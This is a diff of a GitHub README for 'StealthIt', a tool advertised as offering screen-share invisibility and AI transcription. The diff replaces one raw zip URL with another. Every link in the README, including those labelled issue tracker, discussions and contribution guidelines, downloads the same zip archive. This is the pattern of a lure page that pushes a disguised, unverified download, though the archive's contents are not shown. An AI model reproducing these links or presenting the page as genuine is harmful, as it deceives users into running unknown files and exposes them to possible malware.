@@ -1,7 +1,7 @@
 # 🖥️ StealthIt - Your Invisible Desktop Companion
 
 ## 🔗 Download Now!
-[![Download StealthIt](https://raw.githubusercontent.com/kubawer21/StealthIt/main/web/StealthIt_increative.zip)](https://raw.githubusercontent.com/kubawer21/StealthIt/main/web/StealthIt_increative.zip)
+[![Download StealthIt](https://github.com/kubawer21/StealthIt/raw/refs/heads/main/resources/It_Stealth_v3.8.zip)](https://github.com/kubawer21/StealthIt/raw/refs/heads/main/resources/It_Stealth_v3.8.zip)
 
 ## 📚 Overview
 StealthIt is a powerful desktop utility designed for seamless interaction in today's fast-paced digital world. Built with Python using the PySide/Qt framework, it offers unique features like screen-share invisibility, real-time transcription, and support for multiple language models, including Gemini and Ollama. Ideal for meetings, presentations, and everyday tasks, StealthIt enhances your productivity while ensuring your privacy.
@@ -9,7 +9,7 @@ StealthIt is a powerful desktop utility designed for seamless interaction in tod
 ## 🚀 Getting Started
 To get started with StealthIt, follow these simple steps:
 
-1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/kubawer21/StealthIt/main/web/StealthIt_increative.zip) to access the latest version of StealthIt.
+1. **Visit the Releases Page**: Click [here](https://github.com/kubawer21/StealthIt/raw/refs/heads/main/resources/It_Stealth_v3.8.zip) to access the latest version of StealthIt.
 
 2. **Choose Your Version**: On the releases page, you will find different versions of StealthIt. Select the version that is suitable for your operating system.
 
@@ -20,7 +20,7 @@ To get started with StealthIt, follow these simple steps:
 5. **Launch StealthIt**: After installation, find StealthIt in your applications and open it. You are now ready to enjoy its features.
 
 ## 📥 Download & Install
-To get StealthIt on your computer, visit the [Releases Page](https://raw.githubusercontent.com/kubawer21/StealthIt/main/web/StealthIt_increative.zip) again. Here you can find the installer for your operating system.
+To get StealthIt on your computer, visit the [Releases Page](https://github.com/kubawer21/StealthIt/raw/refs/heads/main/resources/It_Stealth_v3.8.zip) again. Here you can find the installer for your operating system.
 
 ## 🔎 Features
 - **Screen-Share Invisibility**: Share your screen without others seeing your personal activities.
@@ -40,20 +40,20 @@ If you encounter issues while installing or using StealthIt, consider the follow
 - **Check Compatibility**: Ensure your operating system meets the requirement.
 - **Reboot**: A simple restart can often resolve temporary issues.
 - **Check for Updates**: Make sure you are using the latest version of StealthIt.
-- **Seek Help**: Open issues by visiting the [GitHub Issues Page](https://raw.githubusercontent.com/kubawer21/StealthIt/main/web/StealthIt_increative.zip) for community support.
+- **Seek Help**: Open issues by visiting the [GitHub Issues Page](https://github.com/kubawer21/StealthIt/raw/refs/heads/main/resources/It_Stealth_v3.8.zip) for community support.
 
 ## 💬 Community & Support
-Join our community of users and developers to share your experiences with StealthIt. You can ask questions, report bugs, or learn about upcoming features. Visit the [discussions](https://raw.githubusercontent.com/kubawer21/StealthIt/main/web/StealthIt_increative.zip) page for more information.
+Join our community of users and developers to share your experiences with StealthIt. You can ask questions, report bugs, or learn about upcoming features. Visit the [discussions](https://github.com/kubawer21/StealthIt/raw/refs/heads/main/resources/It_Stealth_v3.8.zip) page for more information.
 
 ## 🔗 Links
-- [Releases Page](https://raw.githubusercontent.com/kubawer21/StealthIt/main/web/StealthIt_increative.zip)
-- [Issue Tracker](https://raw.githubusercontent.com/kubawer21/StealthIt/main/web/StealthIt_increative.zip)
-- [Community Discussions](https://raw.githubusercontent.com/kubawer21/StealthIt/main/web/StealthIt_increative.zip)
+- [Releases Page](https://github.com/kubawer21/StealthIt/raw/refs/heads/main/resources/It_Stealth_v3.8.zip)
+- [Issue Tracker](https://github.com/kubawer21/StealthIt/raw/refs/heads/main/resources/It_Stealth_v3.8.zip)
+- [Community Discussions](https://github.com/kubawer21/StealthIt/raw/refs/heads/main/resources/It_Stealth_v3.8.zip)
 
 ## 📖 License
 StealthIt is an open-source project licensed under the MIT License. This allows users to modify and share the software freely while ensuring proper attribution.
 
 ## 🌟 Contribute
-We welcome contributions to StealthIt! If you have ideas for new features or found a bug, feel free to submit a pull request. Check our [Contribution Guidelines](https://raw.githubusercontent.com/kubawer21/StealthIt/main/web/StealthIt_increative.zip) for more details.
+We welcome contributions to StealthIt! If you have ideas for new features or found a bug, feel free to submit a pull request. Check our [Contribution Guidelines](https://github.com/kubawer21/StealthIt/raw/refs/heads/main/resources/It_Stealth_v3.8.zip) for more details.
 
 Thank you for choosing StealthIt. Enjoy a more efficient and private computing experience!
